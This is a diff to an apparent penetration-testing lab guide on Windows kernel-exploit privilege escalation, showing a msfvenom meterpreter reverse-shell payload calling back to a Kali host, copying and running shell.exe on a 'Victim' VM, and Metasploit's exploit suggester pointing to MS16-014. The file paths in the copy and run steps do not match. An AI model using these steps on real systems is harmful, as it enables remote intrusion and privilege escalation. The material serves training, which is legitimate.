@@ -1138,9 +1138,9 @@ echo -ne [Base64 String] | base64 -d
 
 ## Privilege Escalation - Kernel Exploits
 
-### Establish a shell 
+### Establish a shell
 
-Kali VM
+**Kali VM**
 
 1\. Open command prompt and type: msfconsole
 
@@ -1178,10 +1178,10 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$KALI -f exe > shell.exe
 7\. Copy the generated file, shell.exe, to the Windows VM.\
 
 
-**Kali**
+**Victim**
 
 ```
-copy  \\tsclient\kali\iexplore.DMP "C:\Users\user\AppData\Local\Temp\iexplore.DMP" 
+copy  \\tsclient\kali\shell.exe "C:\Users\user\Desktop\shell.exe" 
 ```
 
 
@@ -1193,12 +1193,12 @@ Windows VM
 **Victim**
 
 ```
-co
+"C:\Users\user\AppData\Local\Temp\shell.exe" 
 ```
 
 ### Detection & Exploitation 
 
-Kali VM
+**Kali VM**
 
 1\. In Metasploit (msf > prompt) type: run post/multi/recon/local\_exploit\_suggester\
 2\. Identify exploit/windows/local/ms16\_014\_wmi\_recv\_notif as a potential privilege escalation\
